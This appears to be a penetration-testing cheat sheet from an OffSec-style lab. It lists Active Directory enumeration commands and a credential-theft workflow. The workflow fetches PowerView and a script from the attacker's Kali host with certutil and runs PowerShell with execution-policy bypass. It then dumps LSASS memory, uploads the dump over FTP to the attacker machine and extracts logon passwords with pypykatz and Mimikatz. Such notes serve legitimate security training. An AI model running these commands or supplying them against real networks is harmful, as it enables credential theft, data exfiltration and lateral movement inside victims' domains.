# Remote Desk Top
specifying domain with <code>-d</code> flag may be important
```rdesktop -d corp -u offsec -p lab 192.168.160.10```


# Domain Name and Domain Controller Name
## Show Domain-Name And Windows-User-Name
```set user```
(Domain-Name = USERDOMAIN, USERNAME = Windows-Users-Name)

## Show Domain-Controller's Name And Domain-Name
```powershell [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()```


# Users And Groups
## List Local Accounts
```net user ```

## List All Users In Domain
```net user /domain```

## Show Each User's Info
```net user <username> /domain```

## List All Groups In Domain
```net group /domain```


# Enum All Users And Services
(certutil -URLcache -f http://<Kali's IP>/enum_users.ps1 enum_users.ps1)
```PS > powershell -ep bypass .\enum_users.ps1```



# Curret Logged In Users And Active Sessions

(certutil -URLcache -f http://192.168.119.160/PowerView.ps1 PowerView.ps1)
```PS> powershell -ep bypass Import-Module .\PowerView.ps1```

(Computer name "client251", "hostname" command tells you your computer name)

## Show Current Logged In Users
```PS> Get-NetLoggedon -ComputerName client251```

## Show All Activated Sessions
```PS> Get-NetSession -ComputerName dc01  (Probably, dc01 is Doamin Controller (it's ok not to specify "dc01"))```


# LSASS Attack

## TaskManager
On Windows machine (that's to say open the Windows OS by remote desktop):
 start -> WindowsSystem -> taskmanager -> Details -> right click the lsass.exe -> Create dump file (e.g. C:\Users\admin\AppData\Local\Temp\lsass.DMP)

At command prompt:
```> ftp <kali IP address>
ftp> bin
ftp> put lsass.DMP
```

On Kali terminal:
```$ pypykatz lsa minidump lsass.DMP```

## <Mimikatz>
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

[*]Try both TaksManager way and Mimikatz way. They probably result in different.
